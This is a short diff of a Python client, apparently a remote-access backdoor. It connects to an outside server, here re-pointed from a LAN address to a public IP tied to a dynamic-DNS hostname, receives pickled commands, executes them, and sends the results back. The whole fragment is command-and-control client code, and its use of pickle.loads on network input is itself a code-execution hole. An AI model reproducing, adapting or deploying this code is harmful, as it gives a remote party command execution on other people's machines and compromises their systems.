@@ -14,9 +14,9 @@ import time
 
 
 #Server properties
-IP = '192.168.178.60'
-PORT = 7777
-socket = socket.socket()
+IP = '212.238.239.196' #    --> thanathos.hopto.org
+PORT = 9999
+socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP socket
 
 #Try to establish a connection to the server
 try:
@@ -57,9 +57,10 @@ def recv():
             command = pickle.loads(socket.recv(4096))
             print("Got: ", command)
             result = execute(command)
-        except:
+        except socket.error as e:
+            print(e)
             socket.close()
-            pass
+
         send(result)
 
 
